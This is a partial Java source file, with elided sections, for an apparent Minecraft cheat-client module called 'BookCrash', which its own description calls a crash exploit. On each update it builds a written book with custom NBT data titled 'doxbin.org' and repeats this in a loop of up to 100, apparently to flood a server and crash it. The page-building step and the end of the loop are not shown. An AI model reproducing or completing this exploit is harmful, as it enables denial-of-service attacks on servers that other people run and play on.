...
extends Module {
    private final Setting<Mode> mode = this.register(new Setting<Mode>("Mode", Mode.Book));

    public BookCrash() {
        super("BookCrash", "crashsploits ABOBA", Module.Category.MISC, true, false, false);
    }
    ...
    public void onUpdate() {
        if (this.mode.getValue() == Mode.Book && BookCrash.mc.world != null && BookCrash.mc.player != null) {
            ...
            tag.setString("author", "6ixGod");
            tag.setString("title", "doxbin.org");
            tag.setTag("pages", (NBTBase)list);
            book.setTagInfo("pages", (NBTBase)list);
            book.setTagCompound(tag);
            for (i = 0; i < 100 && !BookCrash.mc.player.isSpectator(); ++i) {
